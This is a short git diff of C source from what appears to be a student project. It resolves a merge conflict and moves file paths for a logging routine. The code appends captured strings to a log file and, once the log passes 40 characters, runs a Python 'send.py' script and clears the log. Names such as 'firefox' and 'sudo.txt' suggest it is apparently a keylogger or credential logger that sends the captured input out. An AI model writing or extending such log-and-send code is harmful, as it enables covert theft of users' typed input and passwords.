@@ -5,14 +5,10 @@
 ** Login   <nathan.trehout@epitech.eu>
 **
 ** Started on  Mon Dec 19 16:49:34 2016 Nathan Trehout
-<<<<<<< HEAD
-** Last update Mon Dec 26 16:46:21 2016 Nathan Trehout
-=======
-** Last update Wed Dec 21 15:25:18 2016 Joubert Miguel
->>>>>>> ae11b3d55e45764dfe60925d833117e23c371e5c
+** Last update Sat Dec 31 14:58:33 2016 Nathan Trehout
 */
 
-#include "include/my.h"
+#include "my.h"
 
 int	firefox = 0;
 
@@ -43,14 +39,14 @@ int	verif_file(char *to_write)
   FILE	*file;
 
   i = 0;
-  fd = open("log", S_IRUSR);
+  fd = open("logs/log", S_IRUSR);
   read(fd, buffer, 5000);
   while (buffer[i])
     i++;
   if (i > 40)
     {
-      system("python send.py");
-      file = fopen("log", "w");
+      system("python utils/send.py");
+      file = fopen("logs/log", "w");
     }
   return (0);
   file = fopen("sudo.txt", "w");
@@ -61,7 +57,7 @@ int	put_in_file(char *str, int i)
 {
   FILE	*file;
 
-  file = fopen("log", "aw+");
+  file = fopen("logs/log", "aw+");
   verif_file(str);
   while (i != 0)
     {
